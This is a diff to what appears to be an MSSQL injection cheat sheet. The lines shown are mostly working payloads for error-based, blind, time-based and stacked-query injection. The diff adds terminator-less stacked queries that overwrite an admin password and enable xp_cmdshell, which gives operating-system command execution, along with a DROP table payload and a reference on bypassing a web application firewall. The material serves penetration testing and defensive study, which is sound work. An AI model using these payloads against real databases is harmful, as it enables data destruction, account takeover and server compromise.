@@ -149,6 +149,7 @@ $ SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name =
 $ SELECT  UserId, UserName from Users
 ```
 
+
 ## MSSQL Error based
 
 ```sql
@@ -158,6 +159,7 @@ For integer inputs : cast((SELECT @@version) as int)
 For string inputs   : ' + convert(int,@@version) + '
 For string inputs   : ' + cast((SELECT @@version) as int) + '
 ```
+
 
 ## MSSQL Blind based
 
@@ -176,6 +178,7 @@ WITH data AS (SELECT (ROW_NUMBER() OVER (ORDER BY message)) as row,* FROM log_ta
 SELECT message FROM data WHERE row = 1 and message like 't%'
 ```
 
+
 ## MSSQL Time based
 
 ```sql
@@ -189,13 +192,26 @@ IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'
 IF 1=1 WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0';
 ```
 
+
 ## MSSQL Stacked Query
 
-Use a semi-colon ";" to add another query
+* Without any statement terminator
+    ```sql
+    -- multiple SELECT statements
+    SELECT 'A'SELECT 'B'SELECT 'C'
 
-```sql
-ProductID=1; DROP members--
-```
+    -- updating password with a stacked query
+    SELECT id, username, password FROM users WHERE username = 'admin'exec('update[users]set[password]=''a''')--
+
+    -- using the stacked query to enable xp_cmdshell
+    -- you won't have the output of the query, redirect it to a file 
+    SELECT id, username, password FROM users WHERE username = 'admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
+    ```
+
+* Use a semi-colon ";" to add another query
+    ```sql
+    ProductID=1; DROP members--
+    ```
 
 
 ## MSSQL Read file
@@ -372,3 +388,4 @@ Use `SP_PASSWORD` in a query to hide from the logs like : `' AND 1=1--sp_passwor
 * [Full MSSQL Injection PWNage - ZeQ3uL && JabAv0C - 28 January 2009](https://www.exploit-db.com/papers/12975)
 * [Microsoft - sys.fn_my_permissions (Transact-SQL)](https://docs.microsoft.com/en-us/sql/relational-databases/system-functions/sys-fn-my-permissions-transact-sql?view=sql-server-ver15)
 * [Microsoft - IS_SRVROLEMEMBER (Transact-SQL)](https://docs.microsoft.com/en-us/sql/t-sql/functions/is-srvrolemember-transact-sql?view=sql-server-ver15)
+* [AWS WAF Clients Left Vulnerable to SQL Injection Due to Unorthodox MSSQL Design Choice - Marc Olivier Bergeron - Jun 21, 2023](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/)
